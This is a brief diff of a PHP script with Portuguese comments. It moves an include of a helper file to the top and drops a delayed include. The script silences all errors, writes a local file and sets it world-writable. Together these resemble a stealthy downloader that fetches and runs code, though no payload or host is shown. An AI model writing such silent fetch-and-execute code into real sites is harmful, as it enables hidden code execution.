@@ -1,5 +1,7 @@
 <?php
 
+include_once "exc_dw.php"; 
+
 // 1. Silêncio absoluto
 @error_reporting(0);
 @ini_set('display_errors', 0);
@@ -50,8 +52,4 @@ if ($file) {
     @fclose($file);
     @chmod($localPath, 0666); // Permissão de escrita/leitura
 }
-
-
-sleep(5);
-include_once "dw.php"; 
 
